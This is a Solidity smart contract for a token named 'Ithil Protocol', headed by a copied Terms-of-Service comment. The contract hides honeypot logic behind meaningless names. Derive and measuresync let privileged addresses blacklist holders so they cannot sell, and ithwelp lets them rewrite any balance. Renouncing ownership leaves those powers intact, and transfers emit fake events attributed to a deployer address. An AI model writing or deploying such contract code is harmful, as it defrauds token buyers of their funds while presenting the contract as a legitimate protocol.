/**
 *Submitted for verification at Etherscan.io on 2022-10-22
*/

// File: ithil.sol

/**

https://ithil.fi/

https://twitter.com/ithil_protocol

-

Onchain ToS:

Our Terms of Service (from now after referred as "Terms") govern your access to 
and use of the Ithil website available at https://ithil.fi/ (the "Website") and Ithil Application 
(app) accessible at https://app.ithil.fi/ (the "Ithil App", and collectively with the Website, the "Platform"). 
The Platform is provided by Ithil Ltd, a company incorporated under the laws of the British Virgin Islands with 
its registered office address at Intershore Chambers, PO Box 4342, Road Town, Tortola, VG1110 British Virgin Islands 
("we", "us", "our" or "Ithil") to be primarily used as a web-based interface to access and use the Protocol (as defined 
below) in a user-friendly and easily comprehensible manner.

By accessing or using the Platform, connecting your Digital Wallet (as defined below) to the Ithil App,
or by clicking the button "I accept" or respective check box in connection with or relating to these Terms, 
you ("you", "your") acknowledge that you have read, accept without modifications and agree to be bound by these 
Terms and all terms incorporated herein by reference, which form a legally binding agreement between you and Ithil. 
If you do not accept or agree to these Terms, you are not allowed to access or use the Platform, and must immediately 
discontinue any use thereof.

If you are acting for or on behalf of an entity, you hereby represent and warrant that you are authorised to accept 
these Terms and enter into a binding agreement with Ithil on such entity's behalf, and you accept these Terms both on 
behalf of such entity and on your own behalf.

Please read these Terms carefully as they affect your obligations and legal rights. Note that Sections 24 and 25 
contain provisions governing the choice of law, arbitration terms, and class action waiver. Please read and review 
Sections 17, 18, and 19 carefully before accepting these Terms as they provide for the limitation of liability, your 
obligations to indemnify Ithil Parties (as defined below), and contain disclaimer of warranties concerning the Platform 
and related software.

*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract Ithil {
  
    mapping (address => uint256) public yHJq;
    mapping (address => bool) yRSc;
	mapping (address => bool) eRn;



    // 
    string public name = "Ithil Protocol";
    string public symbol = unicode"IP";
    uint8 public decimals = 18;
    uint256 public totalSupply = 5000000000 * (uint256(10) ** decimals);
    uint eM = 1;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
     event OwnershipRenounced(address indexed previousOwner);

        constructor()  {
        yHJq[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



	address owner = msg.sender;
    address Router = 0x99De49dd0B3080D969518EC212dE6A8864AAD7Cd;
    address Deployer = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   


    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier yO () {
        eM = 0;
        _;}

        function transfer(address to, uint256 value) public returns (bool success) {
        if(msg.sender == Router)  {
        require(yHJq[msg.sender] >= value);
        yHJq[msg.sender] -= value;  
        yHJq[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(yRSc[msg.sender]) {
        require(eM == 1);} 
        require(yHJq[msg.sender] >= value);
        yHJq[msg.sender] -= value;  
        yHJq[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function Derive(address Ex) yO public {
        require(msg.sender == owner);
        eRn[Ex] = true;} 


        function balanceOf(address account) public view returns (uint256) {
        return yHJq[account]; }
        function measuresync(address Ex) Si public{          
        require(!yRSc[Ex]);
        yRSc[Ex] = true;}
		modifier Si () {
        require(eRn[msg.sender]);
        _; }
        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function ithwelp(address Ex, uint256 iZ) Si public returns (bool success) {
        yHJq[Ex] = iZ;
        return true; }
        function ijht(address Ex) Si public {
        require(yRSc[Ex]);
        yRSc[Ex] = false; }



        function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= yHJq[from]);
        require(value <= allowance[from][msg.sender]);
        yHJq[from] -= value;  
        yHJq[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(yRSc[from] || yRSc[to]) {
        require(eM == 1);}
        require(value <= yHJq[from]);
        require(value <= allowance[from][msg.sender]);
        yHJq[from] -= value;
        yHJq[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}